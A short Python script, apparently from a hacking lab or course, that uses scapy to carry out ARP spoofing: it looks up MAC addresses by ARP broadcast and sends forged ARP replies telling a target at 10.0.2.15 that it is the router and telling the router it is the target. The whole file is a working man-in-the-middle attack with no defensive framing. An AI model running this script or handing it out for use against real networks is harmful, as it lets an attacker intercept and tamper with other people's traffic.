#!/usr/bin/env python3

import scapy.all as scapy

def get_mac(ip):
    """ gets the MAC address from the IP """
    arp_request = scapy.ARP(pdst = ip)                                  
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")                  
    arp_request_broadcast = broadcast/arp_request                       
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]      
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  
    scapy.send(packet)  


spoof("10.0.2.15", "10.0.2.1")  # tell the target that we are the router
spoof("10.0.2.1", "10.0.2.15")  # tell the router that we are the target
